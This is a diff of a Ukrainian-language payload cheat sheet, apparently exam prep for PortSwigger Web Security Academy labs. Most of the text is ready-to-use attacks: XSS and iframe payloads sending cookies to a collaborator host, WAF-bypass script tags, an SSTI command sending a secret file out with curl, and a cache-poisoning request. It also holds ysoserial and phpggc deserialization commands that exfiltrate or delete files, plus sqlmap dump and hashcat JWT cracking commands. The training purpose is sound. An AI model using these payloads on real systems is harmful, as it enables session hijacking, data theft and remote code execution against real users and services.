@@ -85,7 +85,7 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=%3Cbody+onload%3
 ```
 https://xxxxxx.net/?'accesskey='x'onclick='document.location="https://your-collaborator-url.com/?cookie="+document.cookie' 
 ```
-***WAF***
+**WAF**
 >трохи спробуємо обійти WAF
 ```
 </ScRiPt ><ScRiPt >document.write('<img src="http://collaborator.oastify.com?c='+document.cookie+'" />');</ScRiPt > 
@@ -119,7 +119,7 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 ```
-***Iframe***
+**Iframe**
 >частково універсальні для exploit server
 ```
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:fetch(\'https://your-collaborator-url.com/\'+document.cookie)','*')">
@@ -129,17 +129,39 @@ body:username.value+':'+this.value
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://your-collaborator-url.com?cookie=${document.cookie}`)>','*')">
 </iframe>
 ```
-***SSTI***
+**SSTI**
 ```
 <%= system("curl https://your-collaborator-url.com/$(cat /home/carlos/secret)") %>
 ```
 ```
 {{request.cookies.get('session')|urlize('https://your-collaborator-url.com/?cookie=')}}
 ```
-***Web cache poisoning /js/geolocate.js***
+**Web cache poisoning /js/geolocate.js**
 ```
 GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location%3d'https%3a//your-collaborator-url.oastify.com/%3fcookie%3d'%2bdocument.cookie%3b
 ```
 ----
-
+**Deserialization**
+>під руками повинні бути готові команди, із робочими шляхами де лежать у вас словники або команди які не потребують додаткових налаштувань чи втурчань, а лише зміни посилання на екзамен.
+```
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar /path/to/file/ysoserial-all.jar CommonsCollections2 "curl https://collaborator.oastify.com -d@/home/carlos/secret" | gzip -c | base64 -w 0
+```
+```
+/path/to/file/phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
+```
+**SQLMAP**
+>тут шлях досить простий, копіюємо з Network із запиту на пошук "Copy as cURL", а далі лише забираємо curl і додаємо sqlmap -u.
+>Зрештою, хто орієнтується із роботою sqlmap, вкурсі що до чого.
+```
+sqlmap -u 'cURL із Network' -p 'parametr' -batch --dbs --tables -T (тут вказати назву таблиці) --dump
+```
+**JWT**
+```
+hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/Payload/jws_secret.txt --force
+```
+>і ще така штука із docker є, це лаба "JWT authentication bypass via algorithm confusion with no exposed key"
+Майте собі піднятий docker і готовий образ, щоб не виправляли під час екзамену трабли із бібліотеками системи.
+```
+docker run --rm -it portswigger/sig2n JWT_1 JWT_2
+```
 
